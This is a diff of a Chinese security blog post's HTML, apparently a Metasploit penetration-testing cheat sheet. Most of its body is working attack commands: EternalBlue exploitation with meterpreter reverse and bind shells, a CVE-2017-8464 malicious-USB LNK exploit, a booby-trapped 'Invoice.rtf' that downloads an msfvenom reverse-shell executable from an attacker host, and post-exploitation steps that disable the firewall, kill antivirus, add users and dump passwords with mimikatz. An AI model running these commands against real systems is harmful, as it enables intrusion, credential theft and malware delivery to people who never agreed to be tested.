@@ -83,14 +83,14 @@
 
 <meta name="description" content="ms17-010可谓一世英雄">
 <meta property="og:type" content="article">
-<meta property="og:title" content="使用ms17-010渗透测试">
+<meta property="og:title" content="MSF渗透测试">
 <meta property="og:url" content="http://yoursite.com/2017/09/20/msf_17_010/index.html">
 <meta property="og:site_name" content="ESE&#39;s Note">
 <meta property="og:description" content="ms17-010可谓一世英雄">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-11-09T11:40:30.699Z">
+<meta property="og:updated_time" content="2017-11-15T09:53:39.584Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="使用ms17-010渗透测试">
+<meta name="twitter:title" content="MSF渗透测试">
 <meta name="twitter:description" content="ms17-010可谓一世英雄">
 
 
@@ -127,7 +127,7 @@
 
 
 
-  <title>使用ms17-010渗透测试 | ESE's Note</title>
+  <title>MSF渗透测试 | ESE's Note</title>
   
 
 
@@ -271,7 +271,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">使用ms17-010渗透测试</h1>
+          <h1 class="post-title" itemprop="name headline">MSF渗透测试</h1>
         
 
         <div class="post-meta">
@@ -326,9 +326,17 @@
 
       
         <p>ms17-010可谓一世英雄<br><a id="more"></a></p>
-<h2 id="1、漏洞检测"><a href="#1、漏洞检测" class="headerlink" title="1、漏洞检测"></a>1、漏洞检测</h2><p>运行数据库<br><code>service postgresql start</code><br>启动msfconsole<br><code>msfconsole -q</code><br>使用smb_ms17_010模块探测MS17-010漏洞<br><code>use auxiliary/scanner/smb/smb_ms17_010</code><br><code>set rhosts 192.168.1.134</code></p>
-<h2 id="2、把扫描结果进行ms17-010漏洞检测"><a href="#2、把扫描结果进行ms17-010漏洞检测" class="headerlink" title="2、把扫描结果进行ms17-010漏洞检测"></a>2、把扫描结果进行ms17-010漏洞检测</h2><p>使用攻击模块<br><code>use exploit/windows/smb/ms17_010_eternalblue</code><br>option（or info）查看参数<br><code>set rhost 192.168.1.134</code><br>这需要路由器开放端口，才能返弹<br><code>set payload windows/x64/meterpreter/reverse_tcp</code><br>这直接绑定<br><code>set payload windows/x64/meterpreter/bind_tcp</code><br>run运行</p>
-<h2 id="3、meterpreter的基本命令"><a href="#3、meterpreter的基本命令" class="headerlink" title="3、meterpreter的基本命令"></a>3、meterpreter的基本命令</h2><p>1.getwd命令：可以获取当前目标机器的工作目录，也可以获得当前系统的工作目录,getuid,getpid<br>2.upload命令：可以上传文件或文件夹到目标机器<br><code>upload /root/muma.py d:\\</code><br>3.download命令：从目标机器上下载文件夹或者文件到攻击机<br><code>download muma.py /root</code><br>4.search命令：支持对远程目标机器上的文件进行搜索<br>5.portfwd命令：这个是meterpreter内嵌的端口转发器,目标主机开放的远程桌面3389端口<br><code>portfwd add -l 3389 -r 10.21.13.225 -p 3389</code><br>这条命令也可以开启3389远程桌面<br><code>run post/windows/manage/enable_rdp</code><br>或<br><code>run getgui -e</code><br>6.ps命令可以用来获取目标主机上正在运行的进程信息<br>7.migrate命令，将当前meterpreter会话从一个进程移植到另外一个进程的内存空间中,如果该程序中断，meterpreter也会中断<br><code>migrate 10652(pid)</code><br>8.execute命令：可以在目标机中执行文件<br><code>execute -H -f cmd.exe</code><br>9.关闭目标机器的防火墙<br><code>netsh adcfirewall set allprofiles state off</code><br>10.添加用户<br><code>run getgui -u xxxxx -p xxxxx</code><br>11.关闭杀毒软件<br><code>run killav</code><br>12.屏幕截图<br><code>screenshot</code><br>13.shell进入windows命令行，exit()回到meterpreter<br>14.打开cmd命令行，看看已打开的端口<br><code>netstat -ano</code><br>15.测试是不是虚拟机<br><code>run post/windows/gather/checkvm</code><br>16.获取明文账号和密码<br><code>load mimikatz</code><br><code>kerberos</code><br><code>msv</code></p>
+<h2 id="ms17-010（smb-445）"><a href="#ms17-010（smb-445）" class="headerlink" title="ms17-010（smb 445）"></a>ms17-010（smb 445）</h2><p>1、漏洞检测<br>运行数据库<br><code>service postgresql start</code><br>启动msfconsole<br><code>msfconsole -q</code><br>使用smb_ms17_010模块探测MS17-010漏洞<br><code>use auxiliary/scanner/smb/smb_ms17_010</code><br><code>set rhosts 192.168.1.134</code></p>
+<p>2、把扫描结果进行ms17-010漏洞检测<br>使用攻击模块<br><code>use exploit/windows/smb/ms17_010_eternalblue</code><br>option（or info）查看参数<br><code>set rhost 192.168.1.134</code><br>这需要路由器开放端口，才能返弹<br><code>set payload windows/x64/meterpreter/reverse_tcp</code><br>这直接绑定<br><code>set payload windows/x64/meterpreter/bind_tcp</code><br>run运行</p>
+<h2 id="CVE-2017-8464（震网漏洞）"><a href="#CVE-2017-8464（震网漏洞）" class="headerlink" title="CVE-2017-8464（震网漏洞）"></a>CVE-2017-8464（震网漏洞）</h2><p>插上U盘即中招<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">use exploit/windows/fileformat/cve_2017_8464_lnk_rce</div><div class="line">set payload windows/x64/meterpreter/reverse_tcp</div><div class="line">set target 1</div><div class="line">set lhost 192.168.1.20</div><div class="line">exploit</div></pre></td></tr></table></figure></p>
+<p><code>cp -r /root/.msf4/local/ /root/1</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">use exploit/multi/handler</div><div class="line">set payload windows/x64/meterpreter/reverse_tcp</div><div class="line">set lhost 192.168.1.20</div><div class="line">exploit -j</div></pre></td></tr></table></figure>
+<p>这里需要注意的是生成的必须放在U盘的根目录（因为需要驱动，坑好久才成功）</p>
+<h2 id="CVE-2017-8570（office）"><a href="#CVE-2017-8570（office）" class="headerlink" title="CVE-2017-8570（office）"></a>CVE-2017-8570（office）</h2><p>只要接受者打开文本即中招<br>链接：<a href="http://pan.baidu.com/s/1dF4J4PF" target="_blank" rel="external">http://pan.baidu.com/s/1dF4J4PF</a> 密码：vn0g<br><code>python cve-2017-8759_toolkit.py -M gen -w Invoice.rtf -u http://192.168.1.20/test.txt</code></p>
+<p><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.20 LPORT=4444 -f exe &gt; shell.exe</code></p>
+<p><code>python cve-2017-8759_toolkit.py -M exp -e http://192.168.1.20/shell.exe -l shell.exe</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">use exploit/multi/handler</div><div class="line">set payload windows/x64/meterpreter/reverse_tcp</div><div class="line">set lhost 192.168.1.20</div><div class="line">exploit -j</div></pre></td></tr></table></figure>
+<h2 id="meterpreter的基本命令"><a href="#meterpreter的基本命令" class="headerlink" title="meterpreter的基本命令"></a>meterpreter的基本命令</h2><p>1.getwd命令：可以获取当前目标机器的工作目录，也可以获得当前系统的工作目录,getuid,getpid<br>2.upload命令：可以上传文件或文件夹到目标机器<br><code>upload /root/muma.py d:\\</code><br>3.download命令：从目标机器上下载文件夹或者文件到攻击机<br><code>download muma.py /root</code><br>4.search命令：支持对远程目标机器上的文件进行搜索<br>5.portfwd命令：这个是meterpreter内嵌的端口转发器,目标主机开放的远程桌面3389端口<br><code>portfwd add -l 3389 -r 10.21.13.225 -p 3389</code><br>这条命令也可以开启3389远程桌面<br><code>run post/windows/manage/enable_rdp</code><br>或<br><code>run getgui -e</code><br>6.ps命令可以用来获取目标主机上正在运行的进程信息<br>7.migrate命令，将当前meterpreter会话从一个进程移植到另外一个进程的内存空间中,如果该程序中断，meterpreter也会中断<br><code>migrate 10652(pid)</code><br>8.execute命令：可以在目标机中执行文件<br><code>execute -H -f cmd.exe</code><br>9.关闭目标机器的防火墙<br><code>netsh adcfirewall set allprofiles state off</code><br>10.添加用户<br><code>run getgui -u xxxxx -p xxxxx</code><br>11.关闭杀毒软件<br><code>run killav</code><br>12.屏幕截图<br><code>screenshot</code><br>13.shell进入windows命令行，exit()回到meterpreter<br>14.打开cmd命令行，看看已打开的端口<br><code>netstat -ano</code><br>15.测试是不是虚拟机<br><code>run post/windows/gather/checkvm</code><br>16.获取明文账号和密码<br><code>load mimikatz</code><br><code>kerberos</code><br><code>msv</code></p>
 <p>远程连接<br><code>mstsc</code></p>
 
       
@@ -534,7 +542,7 @@
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="http://veritas501.space/" title="HD_Veritas501" target="_blank">HD_Veritas501</a>
+                    <a href="http://veritas501.space/" title="Veritas501" target="_blank">Veritas501</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
@@ -546,19 +554,19 @@
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://www.ycjcl.cc/" title="信鑫" target="_blank">信鑫</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://blog.binklac.com/" title="VeroFess" target="_blank">VeroFess</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
                     <a href="http://ksisw.com/posts" title="KsisWhite" target="_blank">KsisWhite</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="http://whereisk0shl.top/" title="k0shl" target="_blank">k0shl</a>
+                    <a href="http://simp1e.leanote.com/" title="leanote_pwn" target="_blank">leanote_pwn</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://whereisk0shl.top/" title="CVE" target="_blank">CVE</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://bendawang.site/" title="Bendawang" target="_blank">Bendawang</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
@@ -584,7 +592,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1、漏洞检测"><span class="nav-number">1.</span> <span class="nav-text">1、漏洞检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2、把扫描结果进行ms17-010漏洞检测"><span class="nav-number">2.</span> <span class="nav-text">2、把扫描结果进行ms17-010漏洞检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3、meterpreter的基本命令"><span class="nav-number">3.</span> <span class="nav-text">3、meterpreter的基本命令</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ms17-010（smb-445）"><span class="nav-number">1.</span> <span class="nav-text">ms17-010（smb 445）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2017-8464（震网漏洞）"><span class="nav-number">2.</span> <span class="nav-text">CVE-2017-8464（震网漏洞）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2017-8570（office）"><span class="nav-number">3.</span> <span class="nav-text">CVE-2017-8570（office）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#meterpreter的基本命令"><span class="nav-number">4.</span> <span class="nav-text">meterpreter的基本命令</span></a></li></ol></div>
             
 
           </div>
@@ -628,7 +636,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共21.1k字</span>
+  <span class="post-count">博客全站共21.3k字</span>
 </div>
 
         
